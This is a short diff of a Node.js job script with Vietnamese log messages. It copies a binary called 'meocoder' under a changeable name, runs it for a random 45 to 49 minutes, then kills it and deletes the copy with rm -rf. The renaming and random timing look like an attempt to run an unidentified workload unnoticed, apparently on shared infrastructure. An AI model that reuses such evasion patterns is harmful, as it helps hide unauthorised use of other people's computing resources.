@@ -9,17 +9,17 @@ const timeRunJobs = ((Math.floor(Math.random() * 5) + 45) * 60) * 1000;
 console.log(`-- task chay trong ${((timeRunJobs / 60) / 1000)} phut`);
 
 
-if (shell.exec(`cp meocoderx ${nameTool}`, { silent: true }).code === 0) {
+if (shell.exec(`cp meocoder ${nameTool}`, { silent: true }).code === 0) {
     console.log('-- giai nen file thanh cong');
 } else {
   console.log('-- giai nen file that bai, su dung tool mac dinh :((');
-  nameTool = 'meocoderx';
+  nameTool = 'meocoder';
 }
 
 (async () => {
   await timeout(timeRunJobs);
     if (shell.exec(`killall ${ nameTool } && pkill ${ nameTool }`, { silent: true }).code === 0) {
-        nameTool !== 'meocoderx' ? shell.exec(`rm -rf ${ nameTool }`, { silent: true }) : null;
+        nameTool !== 'meocoder' ? shell.exec(`rm -rf ${ nameTool }`, { silent: true }) : null;
         console.log('-- ket thuc jobs thanh cong');
     } else {
         console.log('-- ket thuc jobs that bai');
